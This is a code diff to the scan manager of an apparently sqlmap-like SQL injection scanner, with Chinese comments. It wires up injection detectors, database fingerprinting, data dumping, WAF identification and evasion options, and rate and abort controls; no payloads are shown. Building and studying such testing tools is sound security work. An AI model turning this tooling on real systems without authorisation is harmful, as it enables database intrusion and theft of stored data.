@@ -7,38 +7,42 @@ import { TimeBlindDetector } from './detectors/TimeBlindDetector.js';
 import { StackedDetector } from './detectors/StackedDetector.js';
 import { OobDetector } from './detectors/OobDetector.js';
 import { SecondOrderDetector } from './detectors/SecondOrderDetector.js';
-import { SecondOrderDiscovery } from './SecondOrderDiscovery.js';
+import { NoSqlInjectionDetector } from './detectors/NoSqlInjectionDetector.js';
+import { InlineQueryDetector } from './detectors/InlineQueryDetector.js';
 import { DBFingerprinter } from './DBFingerprinter.js';
 import { Extractor } from './Extractor.js';
 import { Exploiter } from './Exploiter.js';
 import { ColumnTypeEnumerator } from './ColumnTypeEnumerator.js';
 import { WafIdentifier } from '../core/waf/WafIdentifier.js';
 import { recommend } from '../core/waf/wafRecommend.js';
-import { Scheduler } from '../services/Scheduler.js';
 import { ReportGenerator } from '../services/ReportGenerator.js';
-import { createTarget, createReport, emptyExtractedData, createVulnerability } from './models.js';
+import { createTarget, createReport, createVulnerability } from './models.js';
 import { TECHNIQUE_TYPES } from './payloads.js';
-import { buildInjectionRequest, sendInjection, obfuscateIfNeeded } from './injection.js';
+import { defaults } from '../config/defaults.js';
 import * as eventBus from '../core/eventBus.js';
+import { withSafeUrl } from '../core/safeUrlKeeper.js';
 import { httpClient } from '../core/httpClient.js';
-import { SafeProbeClient } from '../core/SafeProbeClient.js';
+import { DirectConnector } from '../core/directConnector.js';
 import { oobReceiver } from '../core/oobReceiver.js';
 import { logger } from '../core/logger.js';
+import { buildInjectionRequest, sendInjection, applyPrefixSuffix } from './injection.js';
+import { runScanLoop } from './scanRunner.js';
+import { extractAll, extractByScope } from './extractScope.js';
+
+// [P2] 纯函数工具集已拆分到 scanHelpers.js，此处 re-export 保持向后兼容
+export { urlHash, SYS_DBS, publicTarget, publicReport } from './scanHelpers.js';
+import { mapPool, mergeExtracted, mergeExtractedForResume, hasData, publicTarget } from './scanHelpers.js';
 
 // 扫描管理器（门面模式）：对外暴露 start/stop/getReport/exportReport，
 // 内部串起「发现→指纹→四检测器→提取→构造报告」，全程经 EventBus 推送进度。
-// 生命周期：扫描结束（completed/error/stopped）后经 _finalizeScan 释放 OOB 引用、
-// 并按 scanRetentionMs 定时淘汰扫描快照（防止 scans Map 无限增长导致内存泄漏）。
 export class ScanManager {
-  constructor({ wafIdentifier, wafRecommend, scanRetentionMs, maxScans } = {}) {
+  constructor({ wafIdentifier, wafRecommend, retireTtlMs, maxScans } = {}) {
     this.httpClient = httpClient; // 统一 HttpClient（便于测试时注入 mock）
-    // 扫描快照保留期（ms）：结束后多久自动从内存清除；0 = 不自动清理（谨慎，会泄漏）。
-    this.scanRetentionMs = scanRetentionMs ?? 30 * 60 * 1000;
-    // 内存中最多保留的扫描快照数（超出后按完成时间淘汰最旧的已完成/错误/停止扫描）。
-    this.maxScans = maxScans ?? 20;
-    // scanId -> 淘汰定时器句柄（stop/清理时取消，避免残留定时器）
-    this._evictTimers = new Map();
     this.parser = new TargetParser(this.httpClient);
+    // 扫描上下文回收（P0-R1）：completed/stopped/error 后置 retiredAt，TTL 到期清 scans 条目
+    this.retireTtlMs = retireTtlMs ?? 30000; // 可测参数：测试可传短 TTL 验证回收
+    this.maxScans = maxScans ?? 100; // scans Map 上限，超限淘汰最旧扫描
+    this._scanClients = new Map(); // scanId -> 扫描作用域 HttpClient 视图（按 scanId 独立限速桶）
     // 检测器注册表：新增技术只加一个类并在此处登记（OobDetector 末位，作为盲注/无回显兜底）
     this.detectors = [
       new UnionDetector(),
@@ -51,9 +55,12 @@ export class ScanManager {
     // 二阶注入检测器：独立实例，不进 this.detectors 数组（不参与一阶 per-point 循环，
     // 由 _runSecondOrder 在聚合之后作为补充趟调用，与一阶流水线正交）。
     this.secondOrderDetector = new SecondOrderDetector();
-    // 二阶触发页自动发现器（方向 1）：从目标页链接发现候选触发页并经哨兵回显确认；
-    // 仅当 secondOrder.enabled && autoDiscover && 未手填 triggerUrls 时由 _runSecondOrder 调用。
-    this.secondOrderDiscovery = new SecondOrderDiscovery(this.httpClient);
+    // 非 SQL 注入检测器（NoSQL/GraphQL/SSTI）：同样独立实例，不进一阶循环，由 _runNoSql 补充趟调用（opt-in）。
+    this.noSqlDetector = new NoSqlInjectionDetector();
+    // 内联查询检测器（对标 sqlmap Q）：作为经典 SQLi 技术注册进一阶主调度（technique='inline'），
+    // 仅当用户显式勾选 'inline' 时运行（opt-in），默认 techniques 不含它，避免对无回显点目标产生噪音。
+    this.inlineDetector = new InlineQueryDetector();
+    this.detectors.push(this.inlineDetector);
     this.fp = new DBFingerprinter();
     // WAF 指纹识别 + 推荐（可注入桩，默认使用真实实现；识别复用指纹基线，零额外发包）
     this.wafIdentifier = wafIdentifier || new WafIdentifier();
@@ -77,20 +84,24 @@ export class ScanManager {
     const target = createTarget(input);
     const scanId = nanoid(12);
     const report = createReport(scanId, target);
-    this.scans.set(scanId, { target, report, status: 'running', cancelled: false });
+    this.scans.set(scanId, { target, report, status: 'running', cancelled: false, createdAt: Date.now(), abortController: new AbortController() });
     eventBus.create(scanId);
-    eventBus.emit(scanId, 'scan_started', { scanId, target });
+    // [MERGED: security] 事件脱敏：SSE 不再携带 target 凭据（auth/cookie/header）
+    eventBus.emit(scanId, 'scan_started', { scanId, target: publicTarget(target) });
+    // scans Map 容量上限：超限淘汰最旧扫描（防本地 DoS 长跑内存膨胀）
+    this._evictIfOverLimit();
 
     // 异步执行扫描流水线，避免阻塞 HTTP 响应
     this._run(scanId).catch((err) => {
       logger.error(`扫描 ${scanId} 异常：${err.message}`);
-      eventBus.emit(scanId, 'scan_error', { message: err.message });
+      eventBus.emit(scanId, 'scan_error', { code: err.code, message: err.message });
       const s = this.scans.get(scanId);
       if (s) {
         s.status = 'error';
         s.report.finishedAt = new Date().toISOString();
       }
-      this._finalizeScan(scanId); // 错误路径同样释放 OOB 引用 + 排定淘汰
+      // 错误路径同样回收扫描上下文（30s TTL）
+      this._retire(scanId);
     });
 
     return scanId;
@@ -101,29 +112,92 @@ export class ScanManager {
     const s = this.scans.get(scanId);
     if (!s) return false;
     s.cancelled = true;
+    s.paused = false; // 清除暂停态
+    s.status = 'stopped';
+    // [⑮] 中断在途 HTTP 请求：abort() 触发所有传入 signal 的 axios/undici 请求
+    // 抛出 AbortError，不再等待超时或响应返回。与 s.cancelled 协作：
+    //   abort → 中断当前在途请求（立即生效）
+    //   cancelled → 阻止新请求发出（点边界轮询检查）
+    try { s.abortController?.abort(); } catch { /* 已 abort 或不存在 */ }
     eventBus.emit(scanId, 'scan_stopped', { scanId });
+    // stopped 路径回收扫描上下文
+    this._retire(scanId);
     return true;
   }
 
-  // 获取实时报告
-  getReport(scanId) {
-    const s = this.scans.get(scanId);
-    return s ? s.report : null;
+  // [⑮] 获取扫描级 AbortSignal，供 httpClient wrapper 注入到每个请求
+  getSignal(scanId) {
+    return this.scans.get(scanId)?.abortController?.signal || null;
   }
 
-  // 导出报告（json / html）
+  // [⑮] 包装 httpClient：自动将扫描级 signal 注入到每次 request 调用
+  _wrapWithSignal(scanId, client) {
+    const signal = this.getSignal(scanId);
+    if (!signal || !client || typeof client.request !== 'function') return client;
+    return { ...client, request: (opts) => client.request({ ...opts, signal }) };
+  }
+
+  // [P0-FIX] 暂停扫描：设置 paused 标志（扫描循环在点边界检查并等待），
+  // 不回收上下文、不终止请求。仅 running 状态可暂停。
+  pause(scanId) {
+    const s = this.scans.get(scanId);
+    if (!s || s.status !== 'running') return false;
+    if (s.paused) return true; // 已暂停则幂等
+    s.paused = true;
+    s.status = 'paused';
+    eventBus.emit(scanId, 'scan_paused', { scanId });
+    return true;
+  }
+
+  // 恢复暂停的扫描：清除 paused 标志，回到 running。
+  resume(scanId) {
+    const s = this.scans.get(scanId);
+    if (!s || s.status !== 'paused') return false;
+    s.paused = false;
+    s.status = 'running';
+    eventBus.emit(scanId, 'scan_resumed', { scanId });
+    return true;
+  }
+
+  // 获取实时报告（返回深拷贝，防 running 时序列化撕裂）
+  getReport(scanId) {
+    const s = this.scans.get(scanId);
+    if (!s || !s.report) return null;
+    try {
+      return structuredClone(s.report);
+    } catch {
+      // structuredClone 不可用时回退 JSON 序列化
+      return JSON.parse(JSON.stringify(s.report));
+    }
+  }
+
+  // 导出报告（json / html / csv / markdown / db-json）
   exportReport(scanId, format = 'json') {
     const s = this.scans.get(scanId);
     if (!s) return null;
-    return format === 'html'
-      ? this.reportGen.toHTML(s.report)
-      : this.reportGen.toJSON(s.report);
+    if (format === 'html') return this.reportGen.toHTML(s.report);
+    if (format === 'csv') return this.reportGen.toCSV(s.report);
+    if (format === 'markdown' || format === 'md') return this.reportGen.toMarkdown(s.report);
+    if (format === 'db-json') return JSON.stringify(s.report.data); // 仅拖库数据（库/表/列/行）
+    return this.reportGen.toJSON(s.report);
   }
 
   // 选中技术集合：空/未定义 → 全部（含 stacked）；否则按所选
+  // 若配置了 risk 级别，缩减高风险技术：
+  //   risk 1：仅 union/error/boolean（安全，无写请求/无长时间等待）
+  //   risk 2：全部（含 time/stacked/oob，默认）
+  //   risk 3：全部 + 额外 OR 变体（由 Detector 层消费 risk 字段）
   _selectedTechs(config) {
     const sel = config && config.techniques;
-    return sel && sel.length ? sel : TECHNIQUE_TYPES;
+    let techs = sel && sel.length ? sel : TECHNIQUE_TYPES;
+    // risk 门控
+    const risk = (config && config.risk) != null ? config.risk : 2;
+    if (risk < 2) {
+      // risk 1：排除 time（慢速等待）、stacked（写操作风险）、oob（出站请求）
+      techs = techs.filter((t) => !['time', 'stacked', 'oob'].includes(t));
+    }
+    // risk 3 不需要额外过滤，因为 risk 3 的 OR 变体由 Detector 独立消费 risk 字段
+    return techs;
   }
 
   // 按技术选择过滤检测器（唯一过滤入口）
@@ -132,292 +206,374 @@ export class ScanManager {
     return this.detectors.filter((d) => sel.includes(d.technique));
   }
 
+  // 连接器选择：direct 目标用 DirectConnector 直连数据库，其余用统一 HttpClient 单例。
+  getConnector(target) {
+    return target && target.mode === 'direct' ? new DirectConnector(target) : this.httpClient;
+  }
+
+  // 关闭非单例的连接器（如直连 DirectConnector），避免连接泄漏；HttpClient 单例不关。
+  async _maybeClose(connector) {
+    if (connector && connector !== this.httpClient && connector.close) {
+      try {
+        await connector.close();
+      } catch {
+        /* ignore */
+      }
+    }
+  }
+
+  // 获取扫描作用域的 HttpClient 视图：http 目标包装为按 scanId 独立限速桶的客户端
+  // （前端 ratePerSec 设置由此生效，Detector/Extractor 无需改动），direct 目标原样返回。
+  getScanClient(scanId, target) {
+    const connector = this.getConnector(target);
+    if (connector !== this.httpClient || typeof connector.forScan !== 'function') return connector;
+    if (!this._scanClients.has(scanId)) {
+      // [sqlmap 对标] --reqrate：reqRate > 0 时覆盖 ratePerSec 作为 TokenBucket 速率
+      const reqRate = target.config && target.config.reqRate;
+      const ratePerSec = (reqRate && reqRate > 0 ? reqRate : (target.config && target.config.ratePerSec)) || undefined;
+      const sc = connector.forScan(scanId, ratePerSec);
+      // [sqlmap 对标] --safe-url/--safe-freq：配置了保活 URL 时包装客户端
+      // （SSRF 校验在 client.request 内逐请求执行；失败静默不影响扫描）
+      const cfg = (target && target.config) || {};
+      let view = sc;
+      if (typeof cfg.safeUrl === 'string' && /^https?:\/\//i.test(cfg.safeUrl)) {
+        view = withSafeUrl(sc, { safeUrl: cfg.safeUrl, safeFreq: cfg.safeFreq });
+      }
+      // [P2-5] --force-ssl / --ignore-redirects：协议层策略注入每个请求（对标 sqlmap）。
+      // forceSsl：目标 http:// 强制升级 https（httpClient.request 消费改写）；
+      // ignoreRedirects：不跟随 3xx（httpClient.request 消费跳转上限 0）。
+      // 在 forScan 视图之上再包一层，Detector/Extractor/二阶/NoSQL/WAF 全路径统一生效，
+      // 且不影响未配协议策略的存量扫描（无配置时 view 原样返回零开销）。
+      const proto = cfg.forceSsl === true || cfg.ignoreRedirects === true ? {} : null;
+      if (proto) {
+        const baseRequest = view.request.bind(view);
+        view = {
+          ...view,
+          request: (opts) => baseRequest({
+            ...opts,
+            ...(cfg.forceSsl === true ? { forceSsl: true } : {}),
+            ...(cfg.ignoreRedirects === true ? { ignoreRedirects: true } : {}),
+          }),
+        };
+      }
+      this._scanClients.set(scanId, view);
+    }
+    return this._scanClients.get(scanId);
+  }
+
+  // 指纹结果按目标缓存（同目标多注入点不重复跑 8-9 请求指纹）。
+  // fpCache 存 Promise：并发 worker 同时命中 miss 时共享同一 in-flight 指纹，杜绝重复请求。
+  async _fingerprintCached(fpCache, ctxBase, target, point) {
+    const key = target.baseUrl || target.url || (target.mode === 'direct' ? 'direct' : 'target');
+    let entry = fpCache.get(key);
+    if (!entry) {
+      entry = this.fp
+        .fingerprint({ ...ctxBase, target, point })
+        .catch((e) => {
+          logger.warn(`指纹识别失败：${e.message}`);
+          return null;
+        });
+      fpCache.set(key, entry);
+    }
+    return await entry;
+  }
+
+  // 扫描上下文回收：completed/stopped/error 后置 retiredAt，TTL 到期清 scans 条目 + eventBus + 限速桶
+  _retire(scanId) {
+    const s = this.scans.get(scanId);
+    if (!s || s._retired) return;
+    s._retired = true;
+    s.retiredAt = new Date().toISOString();
+    const timer = setTimeout(() => {
+      this._disposeScan(scanId);
+    }, this.retireTtlMs);
+    if (typeof timer.unref === 'function') timer.unref(); // 不阻塞进程退出
+    s._retireTimer = timer;
+  }
+
+  // 立即清理某次扫描的全部上下文（TTL 到期 / 超限淘汰）
+  _disposeScan(scanId) {
+    const rec = this.scans.get(scanId);
+    this.scans.delete(scanId);
+    eventBus.dispose(scanId);
+    if (this._scanClients.has(scanId)) {
+      if (typeof this.httpClient.removeBucket === 'function') this.httpClient.removeBucket(scanId);
+      // [sqlmap 对标] --max-requests：清理请求计数（防 Map 无界增长）
+      if (typeof this.httpClient.removeRequestCount === 'function') this.httpClient.removeRequestCount(scanId);
+      // [P1-FIX 2026-09-05] Cookie Jar 随扫描退役清理（防跨扫描会话泄漏 + Map 无界增长）
+      if (typeof this.httpClient.clearJar === 'function') this.httpClient.clearJar(scanId);
+      this._scanClients.delete(scanId);
+    }
+    if (rec && rec._retireTimer) clearTimeout(rec._retireTimer);
+  }
+
+  // scans Map 容量上限：超限淘汰最旧扫描
+  // [MERGED: engine ★FIX-2] 只淘汰「非 running」的扫描：运行中的扫描若被淘汰，报告会立即
+  // 从 getReport 中消失（用户拿不到结果），而 _run 的请求仍在继续（脱离治理）。
+  // 全部 running 时宁可暂时超限也不淘汰在途扫描。
+  _evictIfOverLimit() {
+    if (this.scans.size <= this.maxScans) return;
+    let victim = null;
+    let oldestTs = Infinity;
+    for (const [id, rec] of this.scans) {
+      if (rec.status === 'running') continue; // 不淘汰运行中的扫描
+      const ts = rec.createdAt || 0;
+      if (ts < oldestTs) {
+        oldestTs = ts;
+        victim = id;
+      }
+    }
+    if (victim) this._disposeScan(victim);
+  }
+
   // 扫描流水线
   async _run(scanId) {
-    const s = this.scans.get(scanId);
-    if (!s) return;
-    const { target, report } = s;
-
-    // 安全间隔探测（对标 sqlmap --safe-url / --safe-freq）：
-    // 配置了安全 URL 时，用 SafeProbeClient 包裹真实 httpClient，周期性穿插安全探测，
-    // 偏离基线即告警。未配置则直接用真实 httpClient（零侵入）。
-    const spCfg = target.config && target.config.safeProbe;
-    const safeAlerts = [];
-    // 扫描级客户端（fork）：共享全局 httpClient 的连接池，但令牌桶/requestDelayMs/keepAlive
-    // 均为本扫描独立实例——并发扫描各自限速、互不拖慢、互不覆盖配置。
-    // 固定请求间延时（对标 sqlmap --delay）与连接复用（对标 --keep-alive / --no-keep-alive）
-    // 在 fork 内按 config 覆盖，对所有发包入口（sendInjection / Detector.send / Extractor / 指纹等）自动生效。
-    let scanHttpClient = this.httpClient.fork(target.config);
-    if (spCfg && (spCfg.url || (Array.isArray(spCfg.urls) && spCfg.urls.length))) {
-      scanHttpClient = new SafeProbeClient(scanHttpClient, {
-        safeUrl: spCfg.url,
-        safeUrls: Array.isArray(spCfg.urls) ? spCfg.urls : undefined,
-        safeFreq: Number(spCfg.freq) > 0 ? Number(spCfg.freq) : 0,
-        randomize: spCfg.randomize !== false, // 默认随机选 URL；false=顺序轮询
-        onAnomaly: (info) => {
-          safeAlerts.push({
-            url: info.url,
-            reason: info.reason,
-            baselineStatus: info.baseline?.status ?? null,
-            baselineLen: info.baseline?.body?.length ?? null,
-            actualStatus: info.actual?.status ?? null,
-            actualLen: info.actual?.body?.length ?? null,
-            ts: new Date().toISOString(),
-          });
-          eventBus.emit(scanId, 'safe_probe_alert', {
-            url: info.url,
-            reason: info.reason,
-            baselineStatus: info.baseline?.status ?? null,
-            actualStatus: info.actual?.status ?? null,
-          });
-          logger.warn(`安全探测告警（${info.url}）：${info.reason}`);
-        },
-      });
+    return runScanLoop(this, scanId);
+  }
+  // [B-perf] skip-static 参数预筛选（对标 sqlmap --skip-static，opt-in）：
+  // 返回「需完整检测」的点集合；被判静态（同值重复 / 哨兵探测无差异）的点被过滤。
+  // 两层判定（均保守，宁可多测不漏检）：
+  //   a) 同值去重：原始值完全相同的参数只测第一个（零请求成本；检测结论对同值参数等价）。
+  //   b) 哨兵探测：仅剩单点时跳过（无跨点预算可省）；多点时对每点发 1 次哨兵请求
+  //      （值改为明显不同的哨兵值），与「原始值基线」比对——状态码、正文长度、规范化正文
+  //      全部一致且哨兵值未回显在响应中 → 判定静态参数；任一维度有差异 / 任一请求失败
+  //      → 保守保留做完整检测。
+  // 基线按「请求方法 + URL」缓存共享：同页面的多参数目标只发 1 次基线（form 点不同 action
+  // 各自基线），总成本 ≈ 去重后点数 + 1 请求。不修改注入点对象、不改变报告 point 列表。
+  // 精确标记点（precisionMarked，用户显式 * 指定）不参与任何跳过。
+  async _skipStaticPoints(ctxBase, target, points) {
+    if (target.mode === 'direct' || !points || points.length === 0) return points || [];
+    const httpClient = ctxBase.httpClient;
+    const ctx = { ...ctxBase, target };
+    const skip = [];
+    // a) 同值去重（零请求）：原始值完全相同的参数只测第一个
+    const seenValues = new Set();
+    const toProbe = [];
+    for (const p of points) {
+      if (p && p.precisionMarked) {
+        toProbe.push(p); // 用户显式指定的点：不做同值去重，也不做哨兵跳过
+        continue;
+      }
+      const val = p.originalValue == null ? '' : String(p.originalValue);
+      if (seenValues.has(val)) {
+        skip.push(p);
+        continue;
+      }
+      seenValues.add(val);
+      toProbe.push(p);
     }
-    const ctxBase = { httpClient: scanHttpClient, config: target.config };
-
-    // 1) 发现注入点（表单爬取为 async，需 await）
-    const points = await this.parser.discover(target);
-    report.points = points;
-    eventBus.emit(scanId, 'point_discovered', { points });
-
-    // 2) 调度每个注入点（并发池 + 令牌桶限速 + 重试）
-    const scheduler = new Scheduler(target.config.concurrency, target.config.ratePerSec);
-    // pointId -> { point, ctx, found:[{technique, result}] }
-    const foundByPoint = new Map();
-    const extracted = emptyExtractedData();
-    // WAF 指纹聚合（跨注入点去重，按 vendor 保留最高置信度）；识别数据来自指纹基线，零额外发包
-    const wafAgg = new Map();
-    let dbms = null;
-    const selectedTechs = this._selectedTechs(target.config);
-    const stackedSelected = selectedTechs.includes('stacked');
-
-    // OOB 带外接收端：仅当 oob 被选中且显式 enabled 时启动（默认关闭，避免意外出站带外）。
-    // 记录本扫描是否持有 OOB 引用，结束时配对 stop（引用计数归零才真正关闭，不误杀并发扫描）。
-    const oobCfg = target.config.oob;
-    if (selectedTechs.includes('oob') && oobCfg && oobCfg.enabled) {
-      try {
-        await oobReceiver.start(oobCfg);
-        s.oobStarted = true;
-      } catch (e) {
-        logger.warn(`OOB 接收端启动失败，oob 检测将不可用：${e.message}`);
+    if (toProbe.length <= 1) return points.filter((p) => !skip.includes(p));
+    // b) 哨兵探测：每点 1 请求（基线跨点共享）；点级并发限 4，与预筛选对齐
+    const baselineCache = new Map(); // `${method} ${url}` -> Promise<响应|null>
+    const getBaseline = (point) => {
+      const orig = point.originalValue == null ? '' : String(point.originalValue);
+      const req = buildInjectionRequest(target, point, orig);
+      const key = `${req.method || 'GET'} ${req.url}`;
+      if (!baselineCache.has(key)) {
+        baselineCache.set(key, sendInjection(httpClient, ctx, req, { retry: 0 }).catch(() => null));
       }
-    }
-
-    await scheduler.run(points, async (point) => {
-      if (s.cancelled) return;
-
-      // 指纹识别（返回 { dbms, baseline }，baseline 供 WAF 识别复用）
-      // 强制 DBMS（--dbms）：跳过自动指纹判定，仅取基线响应供 WAF 识别与盲注比对，直接采用强制值。
-      const forcedDbms = target.config && target.config.dbms;
-      let fpResult;
-      if (forcedDbms) {
-        const baseReq = buildInjectionRequest(
-          target,
-          point,
-          obfuscateIfNeeded(ctxBase, point.originalValue || '1'),
-          ctxBase
-        );
-        const baselineResp = await sendInjection(this.httpClient, ctxBase, baseReq);
-        fpResult = {
-          dbms: forcedDbms,
-          baseline: {
-            status: baselineResp?.status ?? 0,
-            headers: baselineResp?.headers ?? {},
-            body: String(baselineResp?.data ?? ''),
-          },
-        };
-      } else {
-        fpResult = await this.fp.fingerprint({ ...ctxBase, target, point });
-      }
-      const detectedDbms = fpResult && fpResult.dbms;
-      if (detectedDbms) {
-        point.dbms = detectedDbms;
-        dbms = detectedDbms;
-      }
-      // WAF 指纹识别：复用指纹阶段已抓取的基线响应（status/headers/body），零额外发包
-      const wafCands = this.wafIdentifier.identify((fpResult && fpResult.baseline) || {});
-      for (const c of wafCands) {
-        const prev = wafAgg.get(c.vendor);
-        if (!prev || c.confidence > prev.confidence) wafAgg.set(c.vendor, c);
-      }
-      const ctx = {
-        ...ctxBase,
-        target,
-        point,
-        dbms: detectedDbms || point.dbms,
-        extractor: this.extractor,
-      };
-
-      // 逐个检测器尝试（按技术选择过滤）；经典技术命中维持 break-on-first-hit，
-      // 仅当 stacked 也被选中时才不抢断，确保末位 stacked 能独立确认
-      const found = [];
-      for (const detector of this.activeDetectors(target.config)) {
-        if (s.cancelled) break;
-        eventBus.emit(scanId, 'point_testing', {
-          pointId: point.id,
-          technique: detector.technique,
-        });
+      return baselineCache.get(key);
+    };
+    await this._mapPool(
+      toProbe,
+      async (point) => {
         try {
-          const result = await detector.detect(ctx);
-          if (result.vulnerable) {
-            found.push({ technique: detector.technique, result });
-            // 经典技术维持 break；stacked 本身在末位，不抢断
-            if (detector.technique !== 'stacked' && !stackedSelected) break;
-          }
-        } catch (e) {
-          logger.warn(`检测器 ${detector.technique} 失败：${e.message}`);
+          if (point.precisionMarked) return; // 精确标记点永不跳过
+          const orig = point.originalValue == null ? '' : String(point.originalValue);
+          const sentinel = this._staticSentinel(orig);
+          const sentReq = buildInjectionRequest(target, point, sentinel);
+          // 哨兵探测用零重试（失败即保守保留，不放大探测成本）
+          const [baseRes, sentRes] = await Promise.all([
+            getBaseline(point),
+            sendInjection(httpClient, ctx, sentReq, { retry: 0 }),
+          ]);
+          if (!baseRes || !sentRes) return; // 基线/哨兵任一失败 → 无法判定 → 保守保留
+          // ① 状态码必须一致
+          if ((baseRes.status ?? null) !== (sentRes.status ?? null)) return;
+          const baseBody = String(baseRes.data ?? '');
+          const sentBody = String(sentRes.data ?? '');
+          // ② 正文长度必须一致（字节级，不做容差——判定要保守）
+          if (baseBody.length !== sentBody.length) return;
+          // ③ 规范化正文必须完全一致（仅折叠空白，动态内容敏感）
+          if (this._normalizeForStatic(baseBody) !== this._normalizeForStatic(sentBody)) return;
+          // ④ 哨兵值不得回显在响应中（回显 = 参数参与响应构造 → 动态参数）
+          const injectedSentinel = applyPrefixSuffix(target, point, sentinel);
+          if (sentBody.includes(injectedSentinel)) return;
+          // 四项全过 → 静态参数（改值不影响响应），跳过完整检测
+          skip.push(point);
+        } catch {
+          /* 构造/发送异常 → 保守保留 */
         }
-      }
-      if (found.length) foundByPoint.set(point.id, { point, ctx, found });
-    });
-
-    // 3) 聚合 + 去重（同点 stacked 命中 → 仅留 1 条 stacked(Critical)，其余移入印证）
-    const finalVulns = [];
-    const corroborations = [];
-    for (const { point, ctx, found } of foundByPoint.values()) {
-      const stackedItem = found.find((f) => f.technique === 'stacked');
-      const items = stackedItem ? [stackedItem] : found;
-      if (stackedItem) {
-        for (const f of found) {
-          if (f !== stackedItem) {
-            corroborations.push({ pointId: point.id, technique: f.technique, dbms: f.result.dbms });
-          }
-        }
-      }
-      for (const f of items) {
-        const risk =
-          f.technique === 'stacked'
-            ? 'Critical'
-            : this.reportGen.riskOf([
-                createVulnerability(point.id, f.technique, 'Medium', f.result.payloads, f.result.evidence, f.result.trace),
-              ]);
-        const vuln = createVulnerability(point.id, f.technique, risk, f.result.payloads, f.result.evidence, f.result.trace);
-        vuln.dbms = f.result.dbms;
-        // OOB 带外命中：透传结构化 token/callback 供前端专门展示（vuln 为普通对象，直接附加）
-        if (f.technique === 'oob' && f.result.token) {
-          vuln.oob = { token: f.result.token, callback: f.result.callback };
-        }
-        finalVulns.push(vuln);
-        eventBus.emit(scanId, 'detection_found', { ...f.result, riskLevel: risk });
-      }
-    }
-
-    // 3.5) 二阶补充趟：在一阶聚合之后运行，并入同一 finalVulns（门控 + 独立实例，对一阶零侵入）
-    const soVulns = await this._runSecondOrder(scanId, target, points, dbms);
-    for (const v of soVulns) finalVulns.push(v);
-
-    // 4) 提取：仅对最终保留的漏洞做（union/error 拖库；boolean/time 版本证明）
-    for (const { point, ctx } of foundByPoint.values()) {
-      const vuln = finalVulns.find((v) => v.pointId === point.id);
-      if (!vuln) continue;
-      if (target.config.enableExtract) {
-        if (vuln.technique === 'union' || vuln.technique === 'error') {
-          const exData = await this._extract(scanId, ctx);
-          this._mergeExtracted(extracted, exData);
-        } else if (vuln.technique === 'boolean' || vuln.technique === 'time') {
-          const proof = await this.extractor.extractProof(ctx);
-          if (proof) {
-            eventBus.emit(scanId, 'extraction_progress', {
-              db: point.dbms,
-              table: null,
-              count: 1,
-              note: `盲注二分提取版本：${proof}`,
-            });
-          }
-        }
-      }
-    }
-
-    // 5) 汇总报告并定级
-    report.vulns = finalVulns;
-    report.data = target.config.enableExtract ? extracted : null;
-    report.summary.stackedEnabled = stackedSelected;
-    report.summary.stackedCorroborations = corroborations;
-    const hasData = this._hasData(extracted);
-    report.riskLevel = hasData ? 'Critical' : this.reportGen.riskOf(finalVulns);
-    report.dbms = dbms;
-    report.finishedAt = new Date().toISOString();
-    // WAF 规避标注：任一规避开关开启时，在报告摘要中记录（便于结果复现）
-    const we = target.config && target.config.wafEvasion;
-    if (we && (we.randomUA || we.jitterMs > 0 || we.obfuscate || (we.tamper && we.tamper.enabled))) {
-      report.summary = report.summary || {};
-      report.summary.wafEvasion = {
-        randomUA: !!we.randomUA,
-        jitterMs: Number(we.jitterMs) || 0,
-        obfuscate: !!we.obfuscate,
-        // tamper 链式组合标注（enabled/plugins 有序/intensity 仅审计）
-        tamper: {
-          enabled: !!(we.tamper && we.tamper.enabled),
-          plugins: Array.isArray(we.tamper && we.tamper.plugins) ? [...we.tamper.plugins] : [],
-          intensity: (we.tamper && we.tamper.intensity) || 'medium',
-        },
-      };
-    }
-    // WAF 指纹识别汇总：识别到 WAF 时发射 waf_detected 事件并在报告中记录（零额外发包）
-    const wafVendors = [...wafAgg.values()].sort((a, b) => b.confidence - a.confidence);
-    if (wafVendors.length > 0) {
-      const suggestions = this.wafRecommend(wafVendors);
-      eventBus.emit(scanId, 'waf_detected', { vendors: wafVendors, suggestions });
-      report.summary = report.summary || {};
-      report.summary.wafDetected = wafVendors;
-    }
-    // 安全间隔探测告警汇总（对标 sqlmap --safe-url 偏离告警；仅记录不阻断）
-    if (safeAlerts.length > 0) {
-      report.summary = report.summary || {};
-      report.summary.safeProbeAlerts = safeAlerts;
-    }
-    s.status = 'completed';
-    eventBus.emit(scanId, 'scan_completed', report);
-    this._finalizeScan(scanId); // 释放 OOB 引用 + 排定淘汰定时器（防 scans Map 内存泄漏）
+      },
+      4
+    );
+    return points.filter((p) => !skip.includes(p));
   }
 
-  /**
-   * 扫描收尾（completed / error 路径共用）：
-   * 1) 释放本扫描持有的 OOB 接收端引用（引用计数归零才真正关闭，并发扫描互不误杀）；
-   * 2) 按 scanRetentionMs 排定淘汰定时器（unref，不阻塞进程退出），到点从 scans Map 删除并清理 EventBus；
-   * 3) 超过 maxScans 时按完成时间淘汰最旧快照（防无限增长）。
-   */
-  _finalizeScan(scanId) {
-    const s = this.scans.get(scanId);
-    if (!s) return;
-    if (s.oobStarted) {
-      try {
-        oobReceiver.stop();
-      } catch (e) {
-        logger.warn(`OOB 接收端停止失败：${e.message}`);
+  // 哨兵值构造：数字 +1001（1→1002）、非数字字符串加 _sst 后缀（abc→abc_sst）
+  _staticSentinel(orig) {
+    if (/^-?\d+(\.\d+)?$/.test(orig)) {
+      const n = Number(orig);
+      if (Number.isFinite(n)) return String(n + 1001);
+    }
+    return `${orig}_sst`;
+  }
+
+  // 静态判定用正文规范化：仅折叠连续空白并去首尾（时间戳/CSRF 等任何其它差异都视为动态）
+  _normalizeForStatic(body) {
+    return String(body ?? '')
+      .replace(/\s+/g, ' ')
+      .trim();
+  }
+
+  // P2-P1 参数预筛选：对每个注入点发 3 个廉价探测（基线 + 单引号报错 + 时间向量，点内并行），
+  // 返回「需完整检测」的点；明显无注入迹象的点被过滤（省完整检测的指纹/检测器请求，约 50-75%）。
+  // 保守策略（宁可多测不漏检）：
+  //   · 任一探测请求失败 / 在预算时间内未返回（网络/超时/慢目标）→ 无法判定 → 保守保留；
+  //   · 单引号探测响应明显偏离基线（状态码/长度/前缀变化）→ 可疑 → 保留；
+  //   · 时间向量探测耗时明显高于绝对下限 → 触发延迟 → 保留；
+  //   · 仅当两探皆无信号才判「无注入迹象」→ 跳过完整检测。
+  // 探测带预算竞速（_prefilterBudgetMs）：目标不可达/DNS 慢时探测不阻塞流水线，超时按保守保留处理。
+  // 预筛选不修改注入点对象、不改变报告 point 列表，仅影响「哪些点进入完整检测循环」。
